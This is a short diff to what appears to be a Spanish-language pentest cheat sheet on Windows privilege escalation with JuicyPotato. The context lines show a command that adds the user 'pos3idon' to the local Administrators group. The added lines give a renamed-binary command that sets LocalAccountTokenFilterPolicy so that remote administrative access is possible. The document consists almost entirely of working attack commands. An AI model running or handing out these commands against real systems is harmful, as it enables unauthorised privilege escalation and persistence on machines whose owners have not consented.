@@ -96,3 +96,8 @@ Agregar usuario nuevo al grupo Administrators
 JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net localgroup Administrators pos3idon /add" -l 1234
 ```
 
+...
+
+```
+JP.exe -t * -p c:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1234
+```
